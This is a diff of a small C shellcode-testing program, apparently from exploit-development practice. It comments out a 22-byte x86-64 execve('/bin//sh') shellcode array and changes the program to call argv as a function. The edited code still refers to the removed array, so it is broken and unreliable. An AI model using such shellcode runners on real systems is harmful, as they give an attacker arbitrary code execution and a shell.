@@ -1,17 +1,26 @@
 #include <stdio.h>
 #include <string.h>
+#include <unistd.h>
 
-unsigned char code[]=
-        "\x48\x31\xf6\x56\x48\xbf"
-        "\x2f\x62\x69\x6e\x2f"
-        "\x2f\x73\x68\x57\x54"
-        "\x5f\xb0\x3b\x99\x0f\x05";
+//        "\x48\x31\xf6\x56\x48\xbf"
+//        "\x2f\x62\x69\x6e\x2f"
+//        "\x2f\x73\x68\x57\x54"
+//        "\x5f\xb0\x3b\x99\x0f\x05";
 
-int main(){
+int main(int argc, char *argv[]){
 
-        printf("Longueur shellcode %d\n", (int)strlen(code));
+    printf("Longueur shellcode %d\n", (int)strlen(code));
 
-        int (*ret)() = (int(*)())code;
+//    unsigned char code = argv[1];
+//    unsigned char code[] = testvar;
 
-        ret();
+    int (*ret)() = (int(*)())argv;
+
+    ret();
+//
+////    const char *argvx = ["/bin/sh", "lol"];
+//
+//    execve("/bin/sh", NULL, NULL);
+
+
 }
